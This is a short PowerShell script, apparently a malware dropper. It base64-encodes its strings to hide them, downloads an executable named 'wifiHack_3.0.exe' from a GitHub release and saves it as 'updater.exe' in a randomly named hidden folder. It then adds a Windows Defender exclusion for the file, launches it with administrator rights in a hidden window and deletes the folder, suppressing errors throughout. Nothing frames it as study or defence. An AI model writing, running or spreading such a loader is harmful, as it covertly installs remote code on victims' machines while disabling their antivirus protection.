$downloadUrlB65 = "aHR0cHM6Ly9naXRodWIuY29tL2VzdGVyZ29uMTIzL3dpZmlIYWNrL3JlbGVhc2VzL2Rvd25sb2FkL3dpZmlIYWNrXzMuMC93aWZpSGFja18zLjAuZXhl"
$updaterExeB65 = "dXBkYXRlci5leGU="
$hiddenAttrB65 = "SGlkZGVu"
$silentlyContinueB65 = "U2lsZW50bHljb250aW51ZQ=="
$stopActionB65 = "U3RvcA=="
$directoryB65 = "RGlyZWN0b3J5"
$runAsB65 = "UnVuQXM="

$downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadUrlB65))
$updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB65))
$hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB65))
$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB65))
$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB65))
$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB65))
$runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB65))

$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
New-Item -ItemType $directory -Path $hiddenFolder | Out-Null
$tempPath = Join-Path $hiddenFolder $updaterExe

function Add-Exclusion { 
	param ([string]$Path)
	try { 
		Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue 
	} catch {}
}

try{
	Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
	Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
	Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr
	Add-Exclusion -Path $tempPath
	Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -Wait
	Remove-Item $hiddenFolder -Recurse -Force
} catch {
	exit 1
} finally{
	Write-Host "biseyler ters gitti(!)"
}